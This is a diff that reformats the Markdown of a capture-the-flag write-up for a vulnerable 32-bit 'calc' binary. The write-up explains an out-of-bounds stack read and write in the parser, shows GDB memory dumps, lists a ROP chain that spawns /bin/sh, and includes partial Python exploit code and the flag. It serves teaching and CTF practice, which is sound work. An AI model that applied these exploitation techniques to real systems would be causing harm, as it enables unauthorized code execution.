@@ -12,14 +12,14 @@ elf-32... What the heck XD
 Play around with it! This calculator is problematic. It can only
 deal with arithmatic of positive number. For example, if you type:
 
-```
+```text
 -1+5
 ```
 
 This will return `0` as a result, which is obviously not true. Also, trying
 to type only `0` in the calculator, the error message will show up:
 
-```
+```text
 prevent division by zero
 ```
 
@@ -38,18 +38,18 @@ and the internal logic, one must use IDA Pro.
 
 The binary has five main functions:
 
-- `calc()`: Main loop of the calculator
-- `get_expr()`: Only allow specific character set ([+-\*/%0-9]) to be written
-  into the buffer
-- `init_pool()`: Write zeros into the pool, trivial
-- `parse_expr()`: Poorly written parser
-- `eval()`: Do the operate on the `i` and the `i-1` element of the pool
-  according to the operator
+-  `calc()`: Main loop of the calculator
+-  `get_expr()`: Only allow specific character set ([+-\*/%0-9]) to be written
+   into the buffer
+-  `init_pool()`: Write zeros into the pool, trivial
+-  `parse_expr()`: Poorly written parser
+-  `eval()`: Do the operate on the `i` and the `i-1` element of the pool
+   according to the operator
 
 The key function is `parse_expr()`. It has several weird parts such as:
 
-- No boundary on the for loop
-- Indexing by the argument which is in caller's stack frame
+-  No boundary on the for loop
+-  Indexing by the argument which is in caller's stack frame
 
 According to the result of decompilation, the local variables in `calc()` are
 reside in the stack whose addresses are shown related to the `esp` and
@@ -96,7 +96,7 @@ do some experiments through GDB. If the expression "9+10" is entered (assume
 the breakpoint was set right behind `call 0x804902a <parse_expr>`, i.e. after
 the returning of `parse_expr()`):
 
-```
+```text
 gdb-peda$ x/16xw $esp
 0xffffd080:     0xffffd22c      0xffffd098      0x00000000      0x00000000
 0xffffd090:     0x00000000      0x00000000      0x00000001      0x00000013
@@ -108,7 +108,7 @@ The value of `top` is 1 and the value of `stack[0]` is 19. Then 19 will be
 printed out because `*(stack+top-1)` is 19. What if the expression entered is
 "+5"?
 
-```
+```text
 gdb-peda$ x/16xw $esp
 0xffffd080:     0xffffd22c      0xffffd098      0x00000000      0x00000000
 0xffffd090:     0x00000000      0x00000000      0x00000005      0x00000005
@@ -124,7 +124,7 @@ the content of the specific memory location. And the result will still be the
 content of `stack+top-1`, which is `0xffffd0ac`. But its value is modified
 by the expression.
 
-```
+```text
 gdb-peda$ x/16xw $esp
 0xffffd080:     0xffffd22c      0xffffd098      0x00000000      0x00000000
 0xffffd090:     0x00000000      0x00000000      0x00000005      0x00000005
@@ -136,8 +136,8 @@ gdb-peda$ x/16xw $esp
 
 There are two facts which we gathered after analyzed the binary:
 
-- Leak stack
-- Write stack
+-  Leak stack
+-  Write stack
 
 So controling `eip` through return address should be possible. Another good
 news is that we don't even have to worry about the stackguard because we are
@@ -165,7 +165,7 @@ That means "ret2libc" will not work because the library is compiled into the
 program statically. There is no entry in the GOT of the program. This could be
 checked by using `file` command.
 
-```
+```text
 calc.exe: ELF 32-bit LSB executable, Intel 80386, version 1 (GNU/Linux),
 statically linked, for GNU/Linux 2.6.24,
 BuildID[sha1]=26cd6e85abb708b115d4526bcce2ea6db8a80c64, not stripped
@@ -173,7 +173,7 @@ BuildID[sha1]=26cd6e85abb708b115d4526bcce2ea6db8a80c64, not stripped
 
 Also, `objdump -R` will print the dynamic relocation entries of the program.
 
-```
+```text
 calc.exe:     file format elf32-i386
 
 objdump: calc.exe: not a dynamic object
@@ -191,7 +191,7 @@ which calls `execve("/bin/sh")`.
 Using ROPgadget to find ROP gadget:
 
 ```bash
-$ ./ROPgadget.py --binary ~/secprog/calc.exe
+./ROPgadget.py --binary ~/secprog/calc.exe
 ```
 
 Because the "/bin/sh" string resides in stack, `ebx` needs to be the address
@@ -199,7 +199,7 @@ of the string, which is in stack. ASLR is enabled, so it is needed to poke for
 the actual stack address. The text listed below is an example, real
 exploitation should calculate the location of the string dynamically.
 
-```
+```text
 leak 0xffffd63c's value, modified to 0x080550d0 :  xor eax, eax ; ret
 leak 0xffffd640's value, modified to 0x080701d1 :  pop ecx ; pop ebx ; ret
 leak 0xffffd644's value, modified to 0x00000000 -> for pop ecx
@@ -219,11 +219,11 @@ modified to the address of the first ROP gadget. Then the ROP chain starts to
 work! The exploitation works like this:
 
 1. Poke `ebp+0x10` for the address of the string "/bin/sh".
-2. Set `eax` and `ecx` to 0.
-3. Make `ebx` to be the value of `ebp+0x10`.
-4. Accumulate `eax` to 11
-5. Interrupt
-6. Put the string "/bin/sh" in the address which has already stored in `ebx`
+1. Set `eax` and `ecx` to 0.
+1. Make `ebx` to be the value of `ebp+0x10`.
+1. Accumulate `eax` to 11
+1. Interrupt
+1. Put the string "/bin/sh" in the address which has already stored in `ebx`
 
 ```python
 addrs = ['+361', '+362', '+363', '+364',
@@ -256,12 +256,12 @@ def rop(s):
 
 ## Flag
 
-```
+```text
 SECPROG{C:\Windows\System32\calc.exe}
 ```
 
 ## References
 
-- [JonathanSalwan/ROPgadget][1]
+-  [JonathanSalwan/ROPgadget][1]
 
 [1]: https://github.com/JonathanSalwan/ROPgadget
